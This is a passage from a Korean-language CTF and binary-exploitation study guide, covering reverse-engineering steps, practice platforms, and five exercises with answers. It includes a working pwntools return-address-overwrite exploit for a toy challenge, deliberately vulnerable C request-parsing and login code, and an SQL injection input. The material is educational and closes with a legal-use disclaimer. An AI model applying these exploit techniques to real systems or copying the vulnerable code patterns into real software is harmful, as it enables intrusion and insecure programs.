6. 로컬 테스트 → 원격 서버에 전송 → 플래그 획득!
```

## 20.3 REV 문제 풀이 절차

```
1. 바이너리 타입 확인
   $ file ./crackme
   
2. strings로 힌트 찾기
   $ strings ./crackme | grep -i flag
   $ strings ./crackme | grep -i correct
   
3. Ghidra에서 main 함수 분석
   - 입력 받는 부분 찾기
   - 검증 로직 분석
   - 분기 조건 이해
   
4. 동적 분석 (GDB)
   - 검증 함수에 브레이크포인트
   - 비교하는 값 확인
   
5. 해결 방법:
   a. 알고리즘 이해 후 역산
   b. GDB에서 분기 조건 패치
   c. angr (자동 분석 도구) 사용
```

## 20.4 초보자 추천 플랫폼

```
1. picoCTF (https://picoctf.org)
   - 완전 초보자용
   - 무료, 상시 운영
   - 단계별 난이도

2. TryHackMe (https://tryhackme.com)
   - 가이드 따라하기 형식
   - "Complete Beginner" 경로 추천
   - 일부 무료

3. HackTheBox (https://hackthebox.com)
   - 중급 이상
   - 실제 서버를 공격하는 형식
   - 커뮤니티 활발

4. OverTheWire (https://overthewire.org)
   - 터미널 기반
   - "Bandit" → 리눅스 기초
   - "Narnia" → 바이너리 exploitation 기초

5. pwnable.kr / pwnable.tw
   - PWN 특화
   - 난이도 다양

추천 시작 순서:
  OverTheWire Bandit → picoCTF → TryHackMe → HackTheBox
```

---

# 21. 종합 실습 문제

## 문제 1: C 메모리 추적

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char *a = malloc(16);
    char *b = malloc(16);
    
    strcpy(a, "HELLO");
    strcpy(b, "WORLD");
    
    free(a);
    
    char *c = malloc(16);
    strcpy(c, "CYBER");
    
    printf("a: %s\n", a);   // 출력은?
    printf("b: %s\n", b);   // 출력은?
    printf("c: %s\n", c);   // 출력은?
    printf("a == c? %d\n", a == c);  // 결과는?
    
    free(b);
    free(c);
    return 0;
}
```

<details>
<summary>정답 보기</summary>

- `a`는 free된 후에도 같은 주소를 가리킴 (dangling pointer)
- `c`는 malloc이 a의 해제된 공간을 재사용할 가능성이 높음
- 따라서:
  - `a: "CYBER"` (c와 같은 메모리를 가리키므로)
  - `b: "WORLD"` (변하지 않음)
  - `c: "CYBER"`
  - `a == c? 1` (같은 주소!)
- 이것이 Use-After-Free 취약점의 본질!
- 주의: 이 동작은 구현에 따라 다를 수 있지만, glibc에서는 대부분 이렇게 동작

</details>

## 문제 2: 어셈블리 해석

```asm
; 이 ARM64 함수는 무엇을 하는가?
mystery:
    MOV  W1, #0           ; W1 = 0
    MOV  W2, #1           ; W2 = 1
loop:
    CMP  W0, #0           ; W0과 0 비교
    B.LE done             ; W0 <= 0이면 종료
    ADD  W3, W1, W2       ; W3 = W1 + W2
    MOV  W1, W2           ; W1 = W2
    MOV  W2, W3           ; W2 = W3
    SUB  W0, W0, #1       ; W0 = W0 - 1
    B    loop             ; 반복
done:
    MOV  W0, W1           ; 반환값 = W1
    RET
```

<details>
<summary>정답 보기</summary>

이 함수는 **피보나치 수열의 n번째 값**을 계산합니다!

- W0 = n (입력)
- W1 = 이전 값 (0부터 시작)
- W2 = 현재 값 (1부터 시작)
- 매 반복: W3 = W1 + W2, 그리고 shift

n=5이면:
- W1=0, W2=1 → W3=1
- W1=1, W2=1 → W3=2
- W1=1, W2=2 → W3=3
- W1=2, W2=3 → W3=5
- W1=3, W2=5
- 반환: W1=3... 아닌데?

정정: n=5일 때 루프 5회:
- (0) W1=0, W2=1
- (1) W3=1, W1=1, W2=1
- (2) W3=2, W1=1, W2=2
- (3) W3=3, W1=2, W2=3
- (4) W3=5, W1=3, W2=5
- (5) W3=8, W1=5, W2=8
- 반환: W1=5

fibonacci(5) = 5 ✓

C로 표현:
```c
int mystery(int n) {
    int a = 0, b = 1;
    for (; n > 0; n--) {
        int temp = a + b;
        a = b;
        b = temp;
    }
    return a;
}
```

</details>

## 문제 3: 취약점 찾기

```c
#include <stdio.h>
#include <string.h>

struct request {
    char method[8];      // "GET" or "POST"
    char path[128];
    int content_length;
    char body[256];
};

void parse_request(char *raw) {
    struct request req;
    
    // method 복사
    char *space = strchr(raw, ' ');
    int method_len = space - raw;
    memcpy(req.method, raw, method_len);
    req.method[method_len] = '\0';
    
    // path 복사
    char *space2 = strchr(space + 1, ' ');
    int path_len = space2 - space - 1;
    memcpy(req.path, space + 1, path_len);
    req.path[path_len] = '\0';
    
    // body 복사
    char *body_start = strstr(raw, "\r\n\r\n") + 4;
    strcpy(req.body, body_start);
    
    printf("Method: %s\n", req.method);
    printf("Path: %s\n", req.path);
}
```

<details>
<summary>정답 보기</summary>

여러 취약점이 있습니다:

1. **Buffer Overflow (method)**: method가 8바이트인데, `method_len`을 검사하지 않음.
   "AAAAAAAAAAAA /path HTTP/1.1" 입력 시 method_len > 8 → method 버퍼 오버플로우 → path 덮어쓰기 가능

2. **Buffer Overflow (path)**: path가 128바이트인데, `path_len`을 검사하지 않음.
   매우 긴 경로 → path 버퍼 오버플로우 → content_length, body 덮어쓰기

3. **Buffer Overflow (body)**: `strcpy`는 크기 제한 없이 복사.
   body가 256바이트를 초과하면 스택 오버플로우 → 복귀 주소 덮어쓰기 가능!

4. **NULL 포인터 역참조**: `strchr`이 NULL을 반환할 수 있음 (공백이 없는 입력).
   NULL - raw → 예상치 못한 큰 값 → memcpy 크래시

5. **NULL 포인터 역참조**: `strstr`이 NULL을 반환할 수 있음.
   NULL + 4 → 잘못된 주소 접근

가장 심각한 것은 3번: body의 strcpy로 스택 기반 버퍼 오버플로우 → 임의 코드 실행 가능

</details>

## 문제 4: exploit 설계

```
다음 프로그램이 주어졌을 때, 셸을 획득하는 exploit을 설계하세요.

보호 기법: NX 활성화, ASLR 비활성화, No Canary, No PIE

void win() {
    system("/bin/sh");
}

void vuln() {
    char buf[32];
    printf("입력: ");
    read(0, buf, 100);   // 32바이트 버퍼에 100바이트 읽기!
}

int main() {
    vuln();
    return 0;
}

win()의 주소: 0x401196
```

<details>
<summary>정답 보기</summary>

```python
from pwn import *

p = process('./challenge')

# 페이로드:
# buf(32바이트) + saved_rbp(8바이트) + 복귀 주소
# 복귀 주소를 win()으로 덮어쓰기

payload = b'A' * 32          # buffer 채우기
payload += b'B' * 8           # saved RBP 덮기
payload += p64(0x401196)      # 복귀 주소 = win()

# x86-64에서는 스택 정렬(16바이트)이 필요할 수 있음
# system()이 movaps 명령어 사용 → 16바이트 정렬 필요
# → win() 대신 win()+1 주소 사용하거나 ret gadget 추가

# 정렬 문제 해결 버전:
ret_gadget = 0x40101a  # ret 명령어 주소 (ROPgadget으로 찾기)
payload = b'A' * 32
payload += b'B' * 8
payload += p64(ret_gadget)    # 스택 정렬용 ret
payload += p64(0x401196)      # win()

p.sendline(payload)
p.interactive()
```

핵심 포인트:
- NX 있지만 win() 함수가 이미 존재 → 셸코드 필요 없음
- ASLR 없음 → 주소가 고정
- Canary 없음 → 자유롭게 오버플로우 가능
- buf(32) + rbp(8) = 40바이트 패딩 후 복귀 주소 덮어쓰기

</details>

## 문제 5: 안전한 코드 작성

```
다음 취약한 코드를 안전하게 수정하세요:

void handle_login(int sockfd) {
    char username[64];
    char password[64];
    char query[256];
    
    read(sockfd, username, 200);
    read(sockfd, password, 200);
    
    sprintf(query, "SELECT * FROM users WHERE name='%s' AND pass='%s'",
            username, password);
    
    execute_query(query);
}
```

<details>
<summary>정답 보기</summary>

```c
void handle_login(int sockfd) {
    char username[64];
    char password[64];
    
    // 1. Buffer Overflow 수정: 버퍼 크기에 맞게 읽기
    ssize_t ulen = read(sockfd, username, sizeof(username) - 1);
    if (ulen <= 0) return;
    username[ulen] = '\0';
    
    ssize_t plen = read(sockfd, password, sizeof(password) - 1);
    if (plen <= 0) return;
    password[plen] = '\0';
    
    // 2. SQL Injection 수정: Prepared Statement 사용
    // sprintf로 쿼리를 만들면 안 됨!
    // username에 ' OR 1=1 -- 을 넣으면 모든 계정 로그인 가능
    
    const char *query = "SELECT * FROM users WHERE name=? AND pass=?";
    sqlite3_stmt *stmt;
    sqlite3_prepare_v2(db, query, -1, &stmt, NULL);
    sqlite3_bind_text(stmt, 1, username, -1, SQLITE_STATIC);
    sqlite3_bind_text(stmt, 2, password, -1, SQLITE_STATIC);
    
    // 3. 추가 보안: 비밀번호 평문 비교 금지
    // 실제로는 비밀번호 해시(bcrypt)와 비교해야 함
    
    execute_prepared_query(stmt);
    sqlite3_finalize(stmt);
}
```

원본 코드의 취약점:
1. Buffer Overflow: 64바이트 버퍼에 200바이트 읽기
2. SQL Injection: 사용자 입력을 쿼리에 직접 삽입
3. Format String: sprintf 사용 (간접적으로)
4. 비밀번호 평문 저장/비교 (설계 문제)

</details>

---

# 학습 로드맵 요약

```
[지금]
  이 문서 1회독 (개념 이해)
  ↓
[1개월차]
  C 언어 코드 직접 작성 (1~3장)
  OverTheWire Bandit 클리어
  ↓
[2~3개월차]
  GDB 사용법 익히기 (12장)
  picoCTF REV/PWN 쉬운 문제
  ↓
[4~6개월차]
  이 문서 2회독 (깊은 이해)
  어셈블리 읽기 연습 (9~11장)
  Ghidra로 간단한 바이너리 분석
  ↓
[6~12개월차]
  pwntools로 exploit 작성 (15~16장)
  TryHackMe 중급 경로
  HackTheBox 쉬운 머신
  ↓
[1년 이후]
  CTF 대회 참가
  버그 바운티 도전
  특정 분야 심화 (iOS/Android/Web/Kernel)
```

---

> 마지막으로: 이 문서의 모든 기법은 **교육 및 합법적인 보안 연구** 목적입니다.
> 허가 없이 타인의 시스템에 적용하면 **불법**이며 형사 처벌 대상입니다.
> 항상 자신의 시스템이나 CTF 환경에서만 연습하세요.
> 버그를 발견하면 해당 회사에 책임 있게 보고(Responsible Disclosure)하세요.
> 이것이 진짜 보안 연구자의 윤리입니다.
